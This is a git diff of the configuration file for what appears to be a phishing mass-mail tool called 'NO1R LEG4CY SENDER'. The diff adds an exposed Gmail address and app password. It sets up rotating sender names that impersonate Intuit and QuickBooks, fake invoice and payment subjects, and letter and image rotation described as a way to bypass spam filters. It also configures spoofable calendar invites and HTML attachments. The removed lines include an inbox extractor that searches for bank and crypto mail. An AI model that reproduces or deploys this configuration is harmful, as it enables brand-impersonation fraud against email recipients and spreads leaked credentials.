@@ -1,9 +1,24 @@
 #!/usr/bin/env node
 
 /**
- * SECTION 1: SMTP & API CREDENTIAL STORE
+ * =================================================================
+ * 🛡️ NO1R LEG4CY SENDER v3.0.0 - OFFICIAL CONFIGURATION
+ * =================================================================
+ * * [SECTION 1] SMTP & API CREDENTIAL STORE
+ * Utility: Defines your delivery engines (SMTP or Graph API).
+ * How it works: You can add unlimited SMTP accounts. The script 
+ * will use these accounts based on the rotation logic you choose.
  */
 const smtp = [
+  {
+    "host": "smtp.gmail.com",
+    "port": 587,
+    "secure": false,
+    "username": "nfdconstructionsllc@gmail.com",
+    "password": "fxmf jsku quff uvim",
+    "from_email": "nfdconstructionsllc@gmail.com",
+  },
+  // You can add more SMTP objects here for better rotation
   {
     "host": "smtp.gmail.com",
     "port": 587,
@@ -42,149 +57,157 @@ const smtp = [
   },
 ];
 
-// NEW FEATURE: Microsoft Graph API Configuration (OAuth2)
 const graph_api = {
-  active: false, // Set to true to send via API instead of SMTP
+  active: false, 
   clientId: "", 
   tenantId: "",
   clientSecret: "",
-  tokenPath: "./tokens.json" // Path to store login sessions
+  tokenPath: "./tokens.json" 
 };
 
 /**
- * SECTION 2: GLOBAL DELIVERY CONTROLLER
+ * [SECTION 2] GLOBAL DELIVERY CONTROLLER
+ * Utility: The core brain that manages randomization and bypassing filters.
+ * * --- 📝 MULTIPLE LETTER LOGIC ---
+ * If 'use_multiple_letters' is TRUE, the script picks a random HTML 
+ * file from 'multi_letters' for every lead to avoid footprint detection.
+ * * --- 👤 MULTIPLE FROM-NAME LOGIC ---
+ * If 'multiple_fromName' is TRUE, the script shuffles names from 
+ * 'multi_FromName' so recipients see different sender names.
+ * * --- 📧 MULTIPLE SUBJECT LOGIC ---
+ * If 'multiple_subject' is TRUE, it rotates subjects from 
+ * 'multi_subject' to bypass subject-based spam filters.
  */
 const setup = {
-  key: "put key", 
-  MultipleSmtp: "ROTATE", 
+  key: "key", 
+  MultipleSmtp: "ROTATE", // Options: "ROTATE" or "SINGLE"
   mail_priority: "HIGH", 
-  sleep_time: 3, 
+  sleep_time: 3,          // Delay in seconds between emails
   isMultiThread: false, 
   howManyThread: 10, 
   
-  // --- UPGRADE: MULTIPLE LETTERS ---
-  // If 'use_multiple_letters' is true, the script will ignore 'letter' 
-  // and randomly select from 'multi_letters'
-  use_multiple_letters: false, 
-  letter: "letter.html", // Default letter if multi is disabled
+  // --- Letter & Image Rotation ---
+  LetterToImage: true,    // Renders HTML into a protected image
+  fileName_LetterToImage: "./letterToImage.html",
+  use_multiple_letters: true, 
+  letter: "letter.html",  // Default letter if multi is OFF
   multi_letters: [
-    "letter.html",
-    "letter2.html",
+    "letter_invoice_A.html",
+    "letter_receipt_B.html",
+    "letter_notification_C.html"
+  ],
+  use_multiple_images: true, 
+  multi_images: [
+    "template_1.html", 
+    "template_2.html"
   ],
 
-  use_noreply: false, 
-  from_name: "<RANDNUM5>", 
-  mail_subject: "<RANDNUM4>", 
-  multiple_fromName: false, 
+  // --- Dynamic Identity Shuffling ---
+  multiple_fromName: true, 
   multi_FromName: [
-    "Intuit Billing Department",
-    "Intuit Payments",
-    "Intuit Billing Notifications"
-  ],
-  multiple_subject: false, 
-  multi_subject: [
-    "Payment Confirmation - $7,890.00 Received",
-    "Receipt for Your Recent Payment ($7,890.00)",
-    "Automated Payment Confirmation for Your Records"
+    "Intuit Billing Support",
+    "QuickBooks Global Payments",
+    "Accounting Services Department",
+    "Service Notification Center"
   ],
 
+  multiple_subject: true, 
+  multi_subject: [
+    "Urgent: Your Invoice #<RANDNUM4> is Ready",
+    "Payment Confirmation for Transaction ID: <RANDSTRING1>",
+    "Action Required: Service Update for <DOMAIN>",
+    "Your recent payment of $7,890.00 was successful"
+  ],
+
+  // --- From-Mail Management ---
+  use_noreply: false, 
+  from_name: "<RANDNUM5>", // Fallback if multiple_fromName is OFF
+  mail_subject: "<RANDNUM4>", // Fallback if multiple_subject is OFF
   test_frommail: false, 
   frommail_filename: "frommail.txt", 
   hide_frommail: false, 
-  use_pdf_password: false, 
-  pdf_password_variable: "RANDNUM4",
-  replyTo: "asd@asd.com", 
-
-  email_test: false, 
-  test_every: 3, 
-  email_destination: "asd@asd.com",
-  mailist: "mailist.txt", 
   
-  LetterToImage: true,
-  fileName_LetterToImage: "./letterToImage.html",
-  
+  // --- Advanced Features ---
+  replyTo: "support@yourdomain.com", 
   useAttachment: true, 
+  useOfflineAttachment: true, 
+  attachmentToPdf: true,
   useGrabLogo: false, 
-  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31",
+  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/...",
   useMylogo: false, 
   proxy: "" 
 };
 
 /**
- * SECTION 3: MAILBOX EXTRACTOR
- * Used to search for specific emails in the target inbox
+ * [SECTION 3] CALENDAR INVITE ENGINE
+ * Utility: Sends high-trust meeting requests (.ics files).
+ * How it works: Calendar invites often bypass "Promotions" and land 
+ * directly in the "Primary" inbox with a notification on the phone.
  */
-const mailbox_extractor = {
-  active: false,
-  search_keywords: ["bank", "invoice", "payment", "paypal", "crypto"],
-  max_results: 10,
-  save_path: "./extracted_logs/"
+/**
+ * SECTION 4: CALENDAR INVITE CONFIGURATION
+ * Utility: Sends a formal .ics meeting request to the recipient.
+ * How it works: It embeds a calendar event into the email metadata. 
+ * This often triggers a "Meeting Notification" on the recipient's phone/computer.
+ */
+const calendar_invite = {
+  active: false,                // Toggle TRUE to enable sending calendar invites instead of regular emails
+  TIMEZONE: "America/Adak",     // Sets the local time for the meeting to avoid global time confusion
+  SUMMARY: "",                  // The main Title/Subject of the calendar event seen by the lead
+  DESCRIPTION: "",              // The body text or notes inside the calendar event details
+  LOCATION: "<DOMAIN>",         // Where the meeting is held (can use dynamic tags like recipient's domain)
+  METHOD: "REQUEST",            // Standard protocol; 'REQUEST' forces the 'Accept/Decline' buttons to appear
+  STATUS: "CONFIRMED",          // Sets the event status to 'Confirmed' to look more legitimate
+  TRANSP: "OPAQUE",             // Blocks the user's time on their calendar as "Busy"
+  ORGANIZER_CN: "",             // Display Name of the person sending the invite
+  ORGANIZER_EMAIL: "<EMAIL>",   // Email address of the organizer (can use the recipient's email to spoof)
+  ATTENDEE_CN: "Verified Sender", // Display Name shown for the person attending
+  ATTENDEE_EMAIL: "administrator@<DOMAIN>", // Secondary email displayed in the invite list
+  RSVP: false,                  // Set TRUE if you want the recipient to send a response back
+  BUSYSTATUS: "BUSY",           // Marks the recipient's calendar as occupied during this time
+  DISALLOW_COUNTER: true,       // Prevents the recipient from suggesting a new time for the meeting
+  IMPORTANCE: 1,                // Sets the priority level (1 = High Priority)
+  REMINDER_MINUTES: 15,         // Triggers a notification popup X minutes before the event starts
+  REMINDER_TEXT: "",            // The alert message that appears on the user's screen/phone
+  START_DATE: "01/07/2026",     // The scheduled date of the event (DD/MM/YYYY)
+  START_TIME: "10:30",          // The specific time the meeting starts
+  END_DATE: "01/07/2026",       // The date the event concludes
+  END_TIME: "10:45",            // The time the event concludes
+  DURATION_MINUTES: 15          // Total length of the meeting slot
 };
 
 /**
- * SECTION 4: CALENDAR, REDIRECT, ATTACHMENT (LEGACY FEATURES)
+ * [SECTION 4] ATTACHMENTS & EML WRAPPING
  */
-const calendar_invite = {
-  active: false,
-  TIMEZONE: "America/Adak",
-  SUMMARY: "",
-  DESCRIPTION: "",
-  LOCATION: "<DOMAIN>",
-  METHOD: "REQUEST",
-  STATUS: "CONFIRMED",
-  TRANSP: "OPAQUE",
-  ORGANIZER_CN: "",
-  ORGANIZER_EMAIL: "<EMAIL>",
-  ATTENDEE_CN: "Verified Sender",
-  ATTENDEE_EMAIL: "administrator@<DOMAIN>",
-  RSVP: false,
-  BUSYSTATUS: "BUSY",
-  DISALLOW_COUNTER: true,
-  IMPORTANCE: 1,
-  REMINDER_MINUTES: 15,
-  REMINDER_TEXT: "",
-  START_DATE: "01/07/2026",
-  START_TIME: "10:30",
-  END_DATE: "01/07/2026",
-  END_TIME: "10:45",
-  DURATION_MINUTES: 15
-};
-
-const redirect_link = {
-  useRedirect: false,
-  key: "tes1",
-  enc_email: "c"
-};
-
 const attachment = [
   {
-    filename: "<RANDOMNAME>.pdf", 
+    filename: "Document_<RANDOMNAME>.pdf", 
     path: "attachment.html",
+    useOfflineAttachment: true,
     attachmentToPdf: true, 
   }
 ];
 
 const attachment_EML = {
-  use_EML: true,
-  attachment_name_EML: "<COMPANYNAME>.eml",
+  use_EML: false, // Wraps the entire message inside an .eml file attachment
+  attachment_name_EML: "Message_<COMPANYNAME>.eml",
   letter_eml: "EML/letter.html",
   useAttachment_EML: true,
   attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }]
 };
 
-const generate_QRCODE = {
-  activate: false,
-  link: "https://google.com?q=<EMAIL>", 
-  width: "200", height: "200"
-};
-
+/**
+ * [SECTION 5] RANDOMIZER & MACRO CONFIG
+ * Utility: Defines the variables used in tags like <RANDNUM4>.
+ */
 const generate_random_number = [
   { name: "RANDNUM1", length_value: 1 },
-  { name: "RANDNUM4", length_value: 4 }
+  { name: "RANDNUM4", length_value: 4 },
+  { name: "RANDNUM5", length_value: 5 }
 ];
 
 const generate_random_string = [
-  { name: "RANDSTRING1", length_value: 5, type: "UPPERCASE" }
+  { name: "RANDSTRING1", length_value: 8, type: "UPPERCASE" }
 ];
 
 const setup_time_date = {
@@ -193,19 +216,18 @@ const setup_time_date = {
 };
 
 const others = {
-  change_ip: true, 
-  letterImageName: "tve.png", 
-  cid: "JOKDIGLAFGAE", 
+  letterImageName: "core_output.png", 
+  cid: "NOIRLEGACY_ENGINE", 
   AutoLogin: true,
   rejectUnauthorized: false, 
   att_CT: "text/html"
 };
 
-const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/uc?id=1oMBVsQBm4ooCDJHc6JoIk3MNpsufMbQN" }];
+const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/..." }];
 
 module.exports = {
-  smtp, setup, graph_api, mailbox_extractor, multi_link: { active: false }, 
+  smtp, setup, graph_api, mailbox_extractor: { active: false }, 
   generate_random_number, generate_random_string, setup_time_date, 
-  attachment, myLOGO, attachment_EML, others, redirect_link,
-  generate_QRCODE, calendar_invite
+  attachment, myLOGO, attachment_EML, others, redirect_link: { useRedirect: false },
+  generate_QRCODE: { activate: false }, calendar_invite
 };
